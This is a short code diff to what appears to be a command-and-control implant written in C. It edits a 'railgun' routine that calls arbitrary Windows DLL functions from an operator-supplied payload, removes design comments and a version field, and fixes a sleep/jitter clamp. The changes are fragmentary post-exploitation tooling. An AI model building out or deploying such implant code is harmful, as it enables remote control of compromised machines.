@@ -692,7 +692,6 @@ static ULONG_PTR rgs_call_x86( FARPROC fn, ULONG_PTR * a, int n )
  * can free them on early exit.
  *
  * Payload layout:
- *   [1]  version (must be 1)
  *   [1]  num_dlls
  *   per dll:
  *     [1]  name_len (including null)
@@ -908,29 +907,7 @@ void execute_railgun( char * data, int len )
             if ( !buf ) { BeaconPrintf( CALLBACK_ERROR, "railgun: malloc" ); goto rgs_cleanup; }
             memset( buf, 0, sz );
             RGS_PUSH( buf, RGS_TAG_OUT );
-            /* stash size in parallel â€” we'll need it when dumping the out-buf.
-             * Since we only need it at the CALL site, encode it in the stk_type
-             * via a separate mechanism: push size right after, then CALL knows
-             * to look back.  Simpler: carry size in the PUSH_OUT's slot value
-             * and add a second slot for the actual pointer.
-             *
-             * Re-think: encode out-buf size in a second stack slot tagged 'O'. */
-            /* Actually, let's store the size right after the pointer on the stack.
-             * CALL will read nargs arg types; for 'o' it pops the pointer AND the
-             * size from the stack (size was pushed first). This changes the protocol.
-             *
-             * Simplest correct approach: keep a parallel array of out-buf sizes. */
-            /* The cleaner design: store {ptr, size} as two stack entries with special
-             * tags, and let CALL handle them as a unit. But that complicates the arg
-             * count in the bytecode.
-             *
-             * CHOSEN SOLUTION: for PUSH_OUT, push size then pointer (size is buried
-             * under the pointer). CALL with arg-type 'o' pops both (size first, then ptr).
-             * The compiler emits PUSH_OUT which pushes size then ptr; the nargs count
-             * in CALL already accounts for this being one logical arg. We use a hidden
-             * "size" tag for the size slot. */
 
-            /* Undo the RGS_PUSH above and redo with size slot */
             sp--;  /* remove the pointer we just pushed */
             if ( sp + 2 > RGS_STACK_MAX ) {
                 MSVCRT$free( buf );
@@ -1295,8 +1272,8 @@ void set_sleep( char * data, int len )
     int sleep  = BeaconDataInt( &parser );
     int jitter = BeaconDataInt( &parser );
 
-    if ( sleep == 0 ) {
-        sleep = 0.1;
+    if ( sleep < 1 ) {
+        sleep = 1;
     }
 
     if ( jitter > 100 ) {
